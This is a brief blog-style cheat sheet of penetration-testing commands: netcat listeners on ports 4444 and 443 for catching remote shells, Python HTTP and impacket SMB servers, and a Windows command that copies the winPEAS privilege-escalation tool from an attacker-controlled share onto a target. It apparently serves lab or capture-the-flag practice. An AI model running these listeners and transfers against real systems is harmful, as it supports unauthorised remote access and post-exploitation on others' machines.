---
title: Useful commands
date: 2023-03-24 20:55:00 +0800
categories: [Tools]
tags: [Commands]
pin: false
author: GRX6
layout: post
---

## Start listener

### For Linux

`sudo nc -nvlp 4444`


### For Windows

`sudo rlwrap nc -nvlp 443`

### Web service

`sudo python3 -m http.server 80`

### SMB service with python impacket

`sudo smbserver.py share . -smb2support`

## Get resource from service

### SMB

`copy \\<local_ip>\share\winPEAS.exe .`
